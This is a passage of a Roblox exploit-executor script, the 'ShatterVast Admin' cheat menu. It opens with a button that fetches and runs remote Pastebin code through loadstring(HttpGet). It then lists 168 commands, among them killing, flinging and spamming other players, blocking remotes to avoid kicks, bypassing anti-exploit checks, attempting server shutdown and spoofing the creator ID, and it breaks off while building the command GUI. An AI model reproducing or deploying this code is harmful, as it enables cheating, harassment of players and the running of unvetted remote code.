          loadstring(game:HttpGet("https://pastebin.com/raw/3x8vS8j6", true))()
   end,
}) 

local Button = Tab:CreateButton({
   Name = "ShatterVast Admin",
   Callback = function()
          -- Have Fun!
-- IT TAKE MY SELF 1 HOUR TO RESCRIPT THIS CAUSE SKISPLOIT CANT RUN THE COREGUI
-- Re script by Alex games #9120
-- By illremember#3799

-- Important Loading
trueSettings = {
 commandPrefix = ";";
 hotkeys = {};
 fchotkeymode = "unfc";
}

-- Important Variables
gsPlayers = game:GetService("Players")
gsWorkspace = game:GetService("Workspace")
gsLighting = game:GetService("Lighting")
gsReplicatedStorage = game:GetService("ReplicatedStorage")
gsCoreGui = game:GetService("CoreGui")
gsTween = game:GetService("TweenService")
gsHttp = game:GetService("HttpService")

LP = gsPlayers.LocalPlayer
Mouse = LP:GetMouse()

defaultSettings = gsHttp:JSONEncode(trueSettings)
function CreateSave()
 writefile("Shattervast.txt", defaultSettings)
 wait(0.5)
 local content = readfile("Shattervast.txt")
 local trueValue = gsHttp:JSONDecode(content)
 commandPrefix = trueValue.commandPrefix
 hotkeys = trueValue.hotkeys
 fchotkeymode = trueValue.fchotkeymode
end
function fullUpdate()
 local updatedSettings = {
  commandPrefix = commandPrefix;
  hotkeys = hotkeys;
  fchotkeymode = fchotkeymode;
 }
 local fullUPDATED = gsHttp:JSONEncode(updatedSettings)
 wait(0.2)
 writefile("Shattervast.txt", fullUPDATED)
end
if writefile ~= nil then
 function builder()
  local TESTsave = readfile("Shattervast.txt")
  if TESTsave == nil then
   return false
  else
   return true
  end
 end
 local success, message = pcall(builder)
 if success == true then
  function reader()
   local content = readfile("Shattervast.txt")
   local trueValue = gsHttp:JSONDecode(content)
   commandPrefix = trueValue.commandPrefix
   hotkeys = trueValue.hotkeys
   if trueValue.fchotkeymode == nil then
    fchotkeymode = "unfc"
    fullUpdate()
   else
    fchotkeymode = trueValue.fchotkeymode
   end
  end
  reader()
 elseif success == false then
  CreateSave()
 end
else
 commandPrefix = ";"
 hotkeys = {}
 fchotkeymode = "unfc"
end

CurrentGravity = gsWorkspace.Gravity
CurrentWalkspeed = LP.Character.Humanoid.WalkSpeed
CurrentJumppower = LP.Character.Humanoid.JumpPower
CurrentHipheight = LP.Character.Humanoid.HipHeight
CurrentNormal = LP.DevCameraOcclusionMode

gsWorkspace.Camera.Changed:Connect(function()
 gsWorkspace.Camera.FieldOfView = 70
end)

-- Important Functions
function view(plr)
 if plr.Character.Humanoid ~= nil then
  gsWorkspace.CurrentCamera.CameraSubject = plr.Character.Humanoid
 else
  gsWorkspace.CurrentCamera.CameraSubject = plr.Character.Head
 end
end
function unlockWS()
 for i,part in pairs(gsWorkspace:GetDescendants()) do
  if part:IsA("Part") then
   part.Locked = false
  end
 end
end
function lockWS()
 for i,part in pairs(gsWorkspace:GetDescendants()) do
  if part:IsA("Part") then
   part.Locked = true
  end
 end
end
function FEGodmode()
 local changeview = false
 if gsWorkspace.CurrentCamera.CameraSubject == LP.Character.Humanoid or gsWorkspace.CurrentCamera.CameraSubject == LP.Character then
  changeview = true
 end
 LP.Character.Humanoid.Name = 1
 local l = LP.Character["1"]:Clone()
 l.Parent = LP.Character
 l.Name = "Humanoid"
 wait(0.1)
 LP.Character["1"]:Destroy()
 if changeview then
  game:GetService("Workspace").CurrentCamera.CameraSubject = LP.Character
 end
 LP.Character.Animate.Disabled = true
 wait(0.1)
 LP.Character.Animate.Disabled = false
 LP.Character.Humanoid.DisplayDistanceType = "None"
end
function RocketPropulsion(maxthrust,maxspeed,thrustp,targetplr,name)
 local l = Instance.new("RocketPropulsion")
 l.Parent = LP.Character.HumanoidRootPart
 l.CartoonFactor = 1
 l.MaxThrust = maxthrust
 l.MaxSpeed = maxspeed
 l.ThrustP = thrustp
 l.Name = name
 l.Target = targetplr.Character.HumanoidRootPart
 l:Fire()
end
function createIntro(style, msg, length)
 if gsCoreGui:FindFirstChild("Notification") then
  gsCoreGui:FindFirstChild("Notification"):Destroy()
 end
 local info = "http://www.roblox.com/asset/?id=1281284684"
 local warning = "http://www.roblox.com/asset/?id=1281286925"
 if style == "info" then
  style = info
 elseif style == "warning" then
  style = warning
 end
 local Notification = Instance.new("ScreenGui")
 local Frame = Instance.new("Frame")
 local TextLabel = Instance.new("TextLabel")
 local IMAGE = Instance.new("ImageLabel")
 Notification.Name = "Notification"
 Notification.Parent = game.Players.LocalPlayer.PlayerGui
 Notification.ResetOnSpawn = false
 Frame.Parent = Notification
 Frame.BackgroundColor3 = Color3.new(0.164706, 0.164706, 0.164706)
 Frame.BackgroundTransparency = 0.20000000298023
 Frame.BorderSizePixel = 0
 Frame.Position = UDim2.new(0, 0, -0.2, 0)
 Frame.Size = UDim2.new(1, 0, 0, 30)
 TextLabel.Parent = Frame
 TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
 TextLabel.BackgroundTransparency = 1
 TextLabel.Size = UDim2.new(1, 0, 1, 0)
 TextLabel.Font = Enum.Font.SourceSansLight
 TextLabel.Text = msg
 TextLabel.TextColor3 = Color3.new(0.905882, 0.905882, 0.905882)
 TextLabel.TextScaled = true
 TextLabel.TextSize = 14
 TextLabel.TextWrapped = true
 IMAGE.Parent = Frame
 IMAGE.BackgroundTransparency = 1
 IMAGE.Size = UDim2.new(0, 50, 0, 50)
 IMAGE.Position = UDim2.new(0.1, 0, 0, 0)
 IMAGE.Image = style
 local Intro = Instance.new("ScreenGui")
 local Frame2 = Instance.new("Frame")
 local IMAGE2 = Instance.new("ImageLabel")
 Intro.Name = "Intro"
 Intro.Parent = game.Players.LocalPlayer.PlayerGui
 Intro.ResetOnSpawn = false
 Frame2.Parent = Intro
 Frame2.BackgroundTransparency = 1
 Frame2.BorderSizePixel = 0
 Frame2.Position = UDim2.new(0, 0, -0.2, 0)
 Frame2.Size = UDim2.new(1, 0, 0, 30)
 IMAGE2.Parent = Frame
 IMAGE2.BackgroundTransparency = 1
 IMAGE2.AnchorPoint = Vector2.new(0.5, 0)
 IMAGE2.Size = UDim2.new(0, 240, 0, 120)
 IMAGE2.Position = UDim2.new(0.5, 0, 0, 0)
 IMAGE2.Image = "http://www.roblox.com/asset/?id=1795472522"
 Frame2:TweenPosition(UDim2.new(0, 0, 0, 200), "Out", "Quad", 1.5)
 Frame:TweenPosition(UDim2.new(0, 0, 0, 0), "Out", "Quad", 1.5)
 wait(length)
 pcall(function()
  Frame:TweenPosition(UDim2.new(0, 0, -1.5, 0), "Out", "Quad", 3)
  Frame2:TweenPosition(UDim2.new(0, 0, -1.5, 0), "Out", "Quad", 3)
 end)
 wait(3.01)
 Intro:Destroy()
 Notification:Destroy()
end
function Notification(style, msg, length)
 if gsCoreGui:FindFirstChild("Notification") then
  gsCoreGui:FindFirstChild("Notification"):Destroy()
 end
 local info = "http://www.roblox.com/asset/?id=1281284684"
 local warning = "http://www.roblox.com/asset/?id=1281286925"
 if style == "info" then
  style = info
 elseif style == "warning" then
  style = warning
 end
 local Notification = Instance.new("ScreenGui")
 local Frame = Instance.new("Frame")
 local TextLabel = Instance.new("TextLabel")
 local IMAGE = Instance.new("ImageLabel")
 Notification.Name = "Notification"
 Notification.Parent = game.Players.LocalPlayer.PlayerGui
 Notification.ResetOnSpawn = false
 Frame.Parent = Notification
 Frame.BackgroundColor3 = Color3.new(0.164706, 0.164706, 0.164706)
 Frame.BackgroundTransparency = 0.20000000298023
 Frame.BorderSizePixel = 0
 Frame.Position = UDim2.new(0, 0, -0.2, 0)
 Frame.Size = UDim2.new(1, 0, 0, 30)
 TextLabel.Parent = Frame
 TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
 TextLabel.BackgroundTransparency = 1
 TextLabel.Size = UDim2.new(1, 0, 1, 0)
 TextLabel.Font = Enum.Font.SourceSansLight
 TextLabel.Text = msg
 TextLabel.TextColor3 = Color3.new(0.905882, 0.905882, 0.905882)
 TextLabel.TextScaled = true
 TextLabel.TextSize = 14
 TextLabel.TextWrapped = true
 IMAGE.Parent = Frame
 IMAGE.BackgroundTransparency = 1
 IMAGE.Size = UDim2.new(0, 50, 0, 50)
 IMAGE.Position = UDim2.new(0.1, 0, 0, 0)
 IMAGE.Image = style
 Frame:TweenPosition(UDim2.new(0, 0, 0, 0), "Out", "Quad", 1.5)
 wait(length)
 pcall(function()
  Frame:TweenPosition(UDim2.new(0, 0, -1.5, 0), "Out", "Quad", 3)
 end)
 wait(3.01)
 Notification:Destroy()
end
function hasTools()
 local a = false
 local b = false
 for i,v in pairs(LP.Character:GetDescendants()) do
  if v:IsA("Tool") then
   if v ~= nil then
    a = true
   else
    a = false
   end
  end
 end
 for i,k in pairs(LP.Backpack:GetDescendants()) do
  if k:IsA("Tool") then
   if k ~= nil then
    b = true
   else
    b = false
   end
  end
 end
 return a or b
end
Compliments = {" is the coolest person in this server!", ", I really like your avatar!", ", I really want to be your friend!", " is truly amazing. Truly!", " is incredible!", ", you are my favourite here!!", ", I am complimenting you right now at this very moment.", " you are really awesome", " when will you be my friend!?", " is such a great person", " is a fantastic person!"}
function complimentplr(player)
 local plrName = player.Name
 game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(plrName..Compliments[math.random(1, #Compliments)], "All")
end
function createINFO(player)
 local InfoGUIv2 = Instance.new("ScreenGui")
 local Frame = Instance.new("Frame")
 local Frame_2 = Instance.new("Frame")
 local infoguiCLOSE = Instance.new("TextButton")
 local Frame_3 = Instance.new("Frame")
 local playerName = Instance.new("TextLabel")
 local Frame_4 = Instance.new("Frame")
 local playerAvatar = Instance.new("ImageLabel")
 local playerAccAge = Instance.new("TextLabel")
 local playerId = Instance.new("TextLabel")
 local playerOs = Instance.new("TextLabel")
 local playerMembership = Instance.new("TextLabel")
 local Frame_5 = Instance.new("Frame")
 local Frame_6 = Instance.new("Frame")
 InfoGUIv2.Name = "InfoGUIv2"
 InfoGUIv2.Parent = game.Players.LocalPlayer.PlayerGui
 InfoGUIv2.ResetOnSpawn = false
 Frame.Parent = InfoGUIv2
 Frame.BackgroundColor3 = Color3.new(0, 0, 0)
 Frame.BackgroundTransparency = 1
 Frame.BorderColor3 = Color3.new(0, 0, 0)
 Frame.ClipsDescendants = true
 Frame.Position = UDim2.new(0.45, 0, 1, 0)
 Frame.Size = UDim2.new(0, 265, 0, 302)
 Frame.ZIndex = -1
 Frame_2.Parent = Frame
 Frame_2.BackgroundColor3 = Color3.new(0.290196, 0, 0.447059)
 Frame_2.BorderSizePixel = 0
 Frame_2.Size = UDim2.new(0, 260, 0, 20)
 infoguiCLOSE.Name = "infoguiCLOSE"
 infoguiCLOSE.Parent = Frame_2
 infoguiCLOSE.BackgroundColor3 = Color3.new(1, 1, 1)
 infoguiCLOSE.BackgroundTransparency = 1
 infoguiCLOSE.BorderSizePixel = 0
 infoguiCLOSE.Position = UDim2.new(0, 230, 0, 0)
 infoguiCLOSE.Size = UDim2.new(0, 30, 0, 20)
 infoguiCLOSE.Font = Enum.Font.SourceSansBold
 infoguiCLOSE.Text = "X"
 infoguiCLOSE.TextColor3 = Color3.new(0.992157, 0.992157, 0.992157)
 infoguiCLOSE.TextSize = 20
 Frame_3.Parent = Frame
 Frame_3.BackgroundColor3 = Color3.new(0.482353, 0.121569, 0.635294)
 Frame_3.BorderSizePixel = 0
 Frame_3.Position = UDim2.new(0, 0, 0, 20)
 Frame_3.Size = UDim2.new(0, 260, 0, 40)
 playerName.Name = "playerName"
 playerName.Parent = Frame_3
 playerName.BackgroundColor3 = Color3.new(1, 1, 1)
 playerName.BackgroundTransparency = 1
 playerName.Position = UDim2.new(0, 10, 0, 5)
 playerName.Size = UDim2.new(0, 240, 0, 30)
 playerName.Font = Enum.Font.SourceSansLight
 playerName.Text = player.Name
 playerName.TextColor3 = Color3.new(0.988235, 0.988235, 0.988235)
 playerName.TextScaled = true
 playerName.TextSize = 14
 playerName.TextWrapped = true
 Frame_4.Parent = Frame
 Frame_4.BackgroundColor3 = Color3.new(0.956863, 0.956863, 0.956863)
 Frame_4.BorderSizePixel = 0
 Frame_4.Position = UDim2.new(0, 0, 0, 60)
 Frame_4.Size = UDim2.new(0, 260, 0, 237)
 playerAvatar.Name = "playerAvatar"
 playerAvatar.Parent = Frame_4
 playerAvatar.BackgroundColor3 = Color3.new(1, 1, 1)
 playerAvatar.Position = UDim2.new(0, 85, 0, 10)
 playerAvatar.Size = UDim2.new(0, 85, 0, 85)
 playerAvatar.Image = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username="..player.Name
 playerAccAge.Name = "playerAccAge"
 playerAccAge.Parent = Frame_4
 playerAccAge.BackgroundColor3 = Color3.new(1, 1, 1)
 playerAccAge.BackgroundTransparency = 1
 playerAccAge.Position = UDim2.new(0, 5, 0, 101)
 playerAccAge.Size = UDim2.new(0, 250, 0, 30)
 playerAccAge.Font = Enum.Font.SourceSans
 playerAccAge.Text = "Account Age: "..player.AccountAge
 playerAccAge.TextColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
 playerAccAge.TextScaled = true
 playerAccAge.TextSize = 14
 playerAccAge.TextWrapped = true
 playerId.Name = "playerId"
 playerId.Parent = Frame_4
 playerId.BackgroundColor3 = Color3.new(1, 1, 1)
 playerId.BackgroundTransparency = 1
 playerId.Position = UDim2.new(0, 5, 0, 131)
 playerId.Size = UDim2.new(0, 250, 0, 30)
 playerId.Font = Enum.Font.SourceSans
 playerId.Text = "Account ID: "..player.UserId
 playerId.TextColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
 playerId.TextScaled = true
 playerId.TextSize = 14
 playerId.TextWrapped = true
 playerOs.Name = "playerOs"
 playerOs.Parent = Frame_4
 playerOs.BackgroundColor3 = Color3.new(1, 1, 1)
 playerOs.BackgroundTransparency = 1
 playerOs.Position = UDim2.new(0, 5, 0, 161)
 playerOs.Size = UDim2.new(0, 250, 0, 30)
 playerOs.Font = Enum.Font.SourceSansLight
 playerOs.Text = "Player OS: "..player.OsPlatform
 playerOs.TextColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
 playerOs.TextScaled = true
 playerOs.TextSize = 14
 playerOs.TextWrapped = true
 playerMembership.Name = "playerMembership"
 playerMembership.Parent = Frame_4
 playerMembership.BackgroundColor3 = Color3.new(1, 1, 1)
 playerMembership.BackgroundTransparency = 1
 playerMembership.Position = UDim2.new(0, 5, 0, 191)
 playerMembership.Size = UDim2.new(0, 250, 0, 30)
 playerMembership.Font = Enum.Font.SourceSansLight
 if player.MembershipType == Enum.MembershipType.None then
  playerMembership.Text = "No builder's club."
 elseif player.MembershipType == Enum.MembershipType.BuildersClub then
  playerMembership.Text = "Builder's club!"
 elseif player.MembershipType == Enum.MembershipType.TurboBuildersClub then
  playerMembership.Text = "Turbo Builder's club!"
 elseif player.MembershipType == Enum.MembershipType.OutrageousBuildersClub then
  playerMembership.Text = "Outrageous Builder's club!"
 end
 playerMembership.TextColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
 playerMembership.TextScaled = true
 playerMembership.TextSize = 14
 playerMembership.TextWrapped = true
 Frame_5.Parent = Frame
 Frame_5.BackgroundColor3 = Color3.new(0, 0, 0)
 Frame_5.BackgroundTransparency = 0.69999998807907
 Frame_5.BorderColor3 = Color3.new(0, 0, 0)
 Frame_5.BorderSizePixel = 0
 Frame_5.ClipsDescendants = true
 Frame_5.Position = UDim2.new(0, 10, 0, 10)
 Frame_5.Selectable = true
 Frame_5.Size = UDim2.new(0, 255, 0, 292)
 Frame_5.ZIndex = -1
 Frame_6.Parent = Frame
 Frame_6.BackgroundColor3 = Color3.new(0, 0, 0)
 Frame_6.BackgroundTransparency = 0.69999998807907
 Frame_6.BorderColor3 = Color3.new(0, 0, 0)
 Frame_6.BorderSizePixel = 0
 Frame_6.ClipsDescendants = true
 Frame_6.Position = UDim2.new(0, 8, 0, 8)
 Frame_6.Selectable = true
 Frame_6.Size = UDim2.new(0, 255, 0, 292)
 Frame_6.ZIndex = -1
 local closeGet = {}
 closeGet.Size = UDim2.new(0, 0, 0, 0)
 local openGet = {}
 openGet.Position = UDim2.new(0.45, 0, 0.45, 0)
 local closeFunction = gsTween:Create(Frame, TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), closeGet)
 local openFunction = gsTween:Create(Frame, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), openGet)
 infoguiCLOSE.MouseButton1Click:Connect(function()
  closeFunction:Play()
  Frame:TweenPosition((Frame.Position + UDim2.new(0, 265 / 2, 0, 302 / 2)), "InOut", "Sine", 2)
  wait(2.01)
  Frame:Destroy()
 end)
 openFunction:Play()
 local UserInputService = game:GetService("UserInputService")
 local dragging
 local dragInput
 local dragStart
 local startPos
 local function update(input)
  local delta = input.Position - dragStart
  local dragTime = 0.055
  local SmoothDrag = {}
  SmoothDrag.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
  local dragSmoothFunction = gsTween:Create(Frame, TweenInfo.new(dragTime, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), SmoothDrag)
  dragSmoothFunction:Play()
 end
 Frame.InputBegan:Connect(function(input)
  if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
   dragging = true
   dragStart = input.Position
   startPos = Frame.Position
   input.Changed:Connect(function()
    if input.UserInputState == Enum.UserInputState.End then
     dragging = false
    end
   end)
  end
 end)
 Frame.InputChanged:Connect(function(input)
  if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
   dragInput = input
  end
 end)
 UserInputService.InputChanged:Connect(function(input)
  if input == dragInput and dragging and Frame.Size == UDim2.new(0, 265, 0, 302) then
   update(input)
  end
 end)
end
function clientSided()
 Notification("info", "This command is for the client (you) only, no one else can see!", 6)
end
searchCmds={"1 print [msg] - Prints a message to the developer console","2 warn [msg] - Warns a message to the developer console","3 sit - Makes you sit","4 god - Activates FE Godmode (breaks tools)","5 view [plr] - Changes your camera subject to another player","6 unview - Changes your camera back to your player","7 gravity [num] - Changes workspace gravity to [num]","8 ungravity - Reverts workspace gravity to game's default","9 goto [plr] - Teleports you to a player","10 fecheck - Checks whether the game is FE or not","11 lockws - Locks the whole workspace","12 unlockws - Unlocks the whole workspace","13 noclip - Allows you to walk through walls and other objects","14 clip - Stops noclip, can collide","15 follow [plr] / [num] - Makes you follow a player constantly, optional [num] for how far away to follow","16 unfollow - Stops you from following","17 fling [plr] / [pow] - Uses your character to fling a player, optional [pow] for how much power to put into the fling","18 unfling - Stops you from flinging","19 trail [plr] / [num] - Makes you trail (walk infront) of a player constantly, optional [num] for how far away to trail","20 untrail - Stops you from trailing","21 annoy [plr] - Loop teleports you to the player","22 unannoy - Stops loop teleporting you","23 reset - Resets your character","24 grespawn - Respawns your character, best for use after FE godmode","25 respawn - Respawns your character, best to use if grespawn fails to work","26 speed // ws [num] - Changes your walkspeed (speed or ws) to [num]","27 jumppower // jp [num] - Changes your jumppower (jumppower or jp) to [num]","28 hipheight // hh [num] - Changes your hipheight (hipheight or hh) to [num]","29 default - Changes your walkspeed, jumppower and hipheight back to normal","30 credits - Displays admin credits (by illremember#3799)","31 attach [plr] - Attaches you to a player, tool required","32 fly / [speed] - Enables fly, optional [speed] for how fast to fly","33 unfly - Disables fly","34 kill [plr] - Kills a player, tool required","35 bring [plr] - Brings a player, tool required","36 naked - Displays avatar body colours","37 nolimbs - Deletes all your arms and legs","38 noarms - Deletes both your arms","39 nolegs - Deletes both your legs","40 antikick [on/off] - Blocks all remotes for antikick when on, disables when off","41 blockremote [remote] / [service] - Blocks a remote from firing, optional [service] for where the remote is located","42 remotespy [on/off] - Prints all remotes to developer console when on when fired, stops printing when off","43 bang [plr] / [speed] - Bangs a player, optional [speed] to set animation adjust speed","44 unbang - Stops bang player","45 spam [msg] - Spams [msg] in chat","46 spamdelay [num] - Sets how long to wait in between spamming","47 unspam - Stops spamming","48 info [plr] - Creates GUI with information about player account, shows Account age, membership and account ID","49 age [plr] - Chats account age of player","50 invisible - Enables FE invisibility, by Timeless","51 walk [plr] - Begins to make you loop walk towards player","52 glitch [plr] / [num] - Glitches a player, tool required, optional [num] for strength of glitch","53 tp [plr] [plr] - Teleports a player to another player, tool required","54 givetool [plr] / [tool] - Gives your current equipped tool to player, optional [tool] to pick a tool by name from your inventory","55 givealltools [plr] - Gives all tools currently equipped and in inventory to player","56 blockhats - Removes mesh of all accessories","57 blocktool - Removes mesh of currently equipped tool","58 orbit [plr] - Begins to make you orbit around a player","59 unorbit - Stops you orbiting a player","60 pos - Shows your current position","61 savepos - Saves your current position","62 loadpos - Loads your current position from savepos","63 tppos [num] [num] [num] - Teleports you to position [num], [num], [num]","64 pmspam [plr] [msg] - Makes you spam a player's pm with [msg]","65 unpmspam - Stops spamming a player's pm","66 wsvis [num] - Changes all parts in workspace to [num] transparency","67 bringobj [obj] / [num] - Brings an object in the workspace to you, optional [num] for how far away to bring object","68 cbring [plr] - Brings a player to you constantly on client","69 uncbring - Stops bringing a player to you on client","70 cfreeze [plr] - Freezes a player on your client","71 uncfreeze / [plr] - Unfreezes a player on your cleint","72 unattach - Unattaches you from a player","73 reach [on/off] / [num] - Activates/Deactivates reach for currently equipped tool, optional [num] for how long the reach should be","74 droptool / [tool] - Drops a tool into the workspace, optional [tool] command for which tool to drop","75 drophats - Drops all your accessories into the workspace","76 hidecmdbar - Hides the command bar","77 showcmdbar - Shows the command bar","78 prefix [key] - Changes your prefix to [key] must be 1 character","79 removeinvis - Removes all invisible parts in workspace","80 removefog - Removes fog in lighting","81 animation [id/gui] / [speed] - Makes you play an animation with [id], optional [speed] for adjusting animation speed OR [gui] to open Energize animation GUI","82 btools - Gives you btools for deleting, copying and dragging (client side)","83 esp [plr] - Enables an esp for that player, credits to Infinite Yield","84 unesp / [plr] - Disables all esp, optional [plr] for disabling esp just for that player","85 dice - Chats you rolling a dice for 1, 2, 3, 4, 5 or 6","86 random [min] [max] - Chats you picking a random number between [min] and [max]","87 closegame - Shutsdown/closes your game","88 savetool / [tool] - Saves a tool to your player equipped, optional [tool] for which tool to save in your inventory","89 loadtool / [tool] - Loads a tool from your player, optional [tool] for which tool to load by name","90 savealltool - Saves all tools in your character/inventory","91 loadalltool - Loads all tools in your player saved tools","92 clicktp / [key] - Enables click teleport, optional [key] to set a key instead of clicking","93 clickdel / [key] - Enables click delete part, optional [key] to set a key instead of clicking","94 unclicktp - Disables clicktp","95 unclickdel - Disables clickdel","96 shutdown - Attempts a server shutdown","97 chatlogs - Opens up a chat log gui with options to print chat to developer console","98 stopadmin - Disables currently running admin completely","99 freecam / [speed] - Enables freecam (like flying but not in character), optional [speed] for how fast the freecam should go","100 unfreecam // unfc - Disables freecam","101 fctp [plr] - Teleports your freecam to player","102 gotofc - Teleports you to current freecam position","103 cmds - Opens up this GUI with commands","104 fullcredits - Shows full individual credits for all help with the admin","105 hotkey [key] [cmd] - Creates a hotkey that executes [cmd] when [key] is pressed","106 removehotkey [key] - Removes a hotkey with [key]","107 removeallhotkey - Removes all current hotkeys for commands","108 printhotkeys - Prints all current existing hotkeys","109 os [plr] - Chats the current OS of a player","110 spin [plr] - Makes you spin with a player, tool required","111 unspin - Stops you spinning a player/teleporting to a player","112 explorer - Loads DEX explorer","113 maxzoom [num] - Changes your maxzoom to number","114 stare [plr] - Makes you stare at another player","115 unstare [plr] - Makes you stop staring at player","116 tempgod - Enables temporary FE godmode, does not work on all games, does not break tools","117 void [plr] - Teleports you and a player to the void, requires a tool","118 freefall [plr] - Makes you and a player freefall to the ground","119 version - Shows current admin's version","120 shiftlockon - Enables shift lock if not enabled by game developer","121 copychat [plr] - Makes you copy the chat player says, use uncopychat to stop copying chat","122 newattach [plr] - Does not FE Godmode you, requires 2 tools, attaches you to player","123 newkill [plr] - Does not FE Godmode you, requires 2 tools, kills player","124 newbring [plr] - Does not FE Godmode you, requires 2 tools, brings player","125 spawn [ws/jp/hh/god] [num] - Sets your walkspeed/jumppower/hipheight to number whenever you respawn, or makes you FE Godded whenever you respawn","126 unspawn - Stops you spawning with stats set by "..commandPrefix.."spawn","127 autosavetool [on/off] - Auto saves your tools when you reset","128 beginbot / [mode] - Makes you a bot for other players, type just "..commandPrefix.."beginbot to print available modes","129 endbot / [mode] - Ends "..commandPrefix.."beginbot, optional [mode] to disable one mode only","130 stopsit - Disables your ability to sit","131 gosit - Enables your ability to sit","132 spawnpoint - Sets your spawnpoint for whenever you reset to where you are","133 nospawn - Removes your spawnpoint","134 chaterror - Creates a chat error, works best first time","135 bypass [on/off] - Changes certain commands like "..commandPrefix.."fly so they are not detected by most anti-exploits", "136 fixcam - Fixes your camera in case it breaks", "137 gotoobj [obj] - Teleports you to a part in the workspace, make sure you put the name properly!", "138 breakcam - Makes it so your camera can go through parts, fixed with "..commandPrefix.."fixcam", "139 inviscam - Makes it so your camera goes through parts and makes them transparent so your character is always visible, fixed with "..commandPrefix.."fixcam", "140 printobj / [key] - Prints the object's path clicked to developer console, optional [key] for key pressed instead of click", "141 unprintobj - Stops printobj from running", "142 hotkeyfc [goto/unfc] - If freecam is set as a hotkey, chooses whether to use unfreecam or gotofc when disabling through a hotkey", "143 carpet [plr] - Makes you a carpet for a player", "144 uncarpet - Stops carpet", "145 brickcreate [num] / [pos] [pos] [pos] - Creates [num] amount of bricks from accessories, wont work in all games, optional [pos] for position to create bricks", "146 uncopychat - Stops copying chat", "147 forward / [speed] - Makes you automatically move forward default speed is 1", "148 unforward - Stops you moving automatically forward from forward", "149 id [plr] - Makes you chat the user ID of the player", "150 spinhats / [pow] - Makes all your accessories begin to spin around! Credit to xFunnieuss.", "151 unspinhats - Stops spinhats from spinning accessories", "152 headless - Makes you headless, but cannot control your character after, use grespawn to reset", "153 savemap - Saves the current workspace/map", "154 loadmap - Loads map saved by savemap", "155 creatorid - Changes your user ID to the game creator's user ID", "156 gameid - Shows the game's ID", "157 delobj [obj] - Allows you to delete an object in the workspace by name", "158 glide [plr] / [speed] - Makes you glide towards a player, optional [speed] for the speed of gliding", "159 stutter [on/off] - Makes your character begin stuttering as you move", "160 platform - Creates a platform on your client that you can stand on, deletes in 20 seconds", "161 servertime - Gets the server time", "162 ride [plr] - Makes you ride a player's head", "163 unride [plr] - Makes you stop riding a player's head", "164 cmute [plr] - Client mutes a player, useful for muting spammers", "165 uncmute - Unmutes a player that has been cmuted", "166 hat [plr] - Makes you carpet a player, but on their head", "167 unhat - Stops hat from running", "168 chat [msg] - Makes you chat a string, useful for hotkeys"}
CMDS={"print [msg]","warn [msg]","sit","god","view [plr]","unview","gravity [num]","ungravity","goto [plr]","fecheck","lockws","unlockws","noclip","clip","follow [plr] / [num]","unfollow","fling [plr] / [pow]","unfling","trail [plr] / [num]","untrail","annoy [plr]","unannoy","reset","grespawn","respawn","speed // ws [num]","jumppower // jp [num]","hipheight // hh [num]","default","credits","attach [plr]","fly / [speed]","unfly","kill [plr]","bring [plr]","naked","nolimbs","noarms","nolegs","antikick [on/off]","blockremote [remote] / [service]","remotespy [on/off]","bang [plr] / [speed]","unbang","spam [msg]","spamdelay [num]","unspam","info [plr]","age [plr]","invisible","walk [plr]","glitch [plr] / [num]","tp [plr] [plr]","givetool [plr] / [tool]","givealltools [plr]","blockhats","blocktool","orbit [plr]","unorbit","pos","savepos","loadpos","tppos [num] [num] [num]","pmspam [plr] [msg]","unpmspam","wsvis [num]","bringobj [obj] / [num]","cbring [plr] / [num]","uncbring","cfreeze [plr]","uncfreeze / [plr]","unattach","reach [on/off] / [num]","droptool / [tool]","drophats","hidecmdbar","showcmdbar","prefix [key]","removeinvis","removefog","animation [id/gui] / [speed]","btools","esp [plr]","unesp / [plr]","dice","random [min] [max]","closegame","savetool / [tool]","loadtool / [tool]","savealltool","loadalltool","clicktp / [key]","clickdel / [key]","unclicktp","unclickdel","oof","chatlogs","stopadmin","freecam / [speed] // fc / [speed]","unfreecam // unfc","gotofc","cmds","fullcredits","hotkey [key] [cmd]","removehotkey [key]","removeallhotkey","printhotkeys","os [plr]","spin [plr]","unspin","fctp [plr]","explorer","maxzoom [num]","stare [plr]","unstare [plr]","tempgod","void [plr]","freefall [plr]","version","shiftlockon","copychat [plr]","newattach [plr]","newkill [plr]","newbring [plr]","spawn [ws/jp/hh/god] [num]","unspawn","autosavetool [on/off]","beginbot / [mode]","endbot / [mode]","stopsit","gosit","spawnpoint","nospawn","chaterror", "bypass [on/off]", "fixcam", "gotoobj [obj]", "breakcam", "inviscam", "printobj / [key]", "unprintobj", "hotkeyfc [goto/unfc]", "carpet [plr]", "uncarpet", "brickcreate [num] / [pos] [pos] [pos]", "uncopychat", "forward / [speed]", "unforward", "id [plr]", "spinhats / [pow]", "unspinhats", "headless", "savemap", "loadmap", "creatorid", "gameid", "delobj [obj]", "glide [plr] / [speed]", "stutter [on/off]", "platform", "servertime", "ride [plr]", "unride", "cmute [plr]", "uncmute", "hat [plr]", "unhat", "chat [msg]"} -- 168
local CMDS_GUI_V2 = Instance.new("ScreenGui")
local CMDSmain = Instance.new("Frame")
local CMDSframemain = Instance.new("Frame")
local cmdgui_topframe = Instance.new("Frame")
local closecmdsgui = Instance.new("TextButton")
local cmdgui_midframe = Instance.new("Frame")
local cmdsgui_SearchFunction = Instance.new("TextBox")
local cmdsgui_searchDETAILFRAME = Instance.new("Frame")
local cmdsgui_searchDETAILTEXT = Instance.new("TextLabel")
local ListofCMDS = Instance.new("ScrollingFrame")
local cmdTutorial = Instance.new("TextLabel")
local cmdTutorial_2 = Instance.new("TextLabel")
local cmdTutorial_3 = Instance.new("TextLabel")
local CMDS_Shadow = Instance.new("Frame")
local CMDS_Shadow2 = Instance.new("Frame")
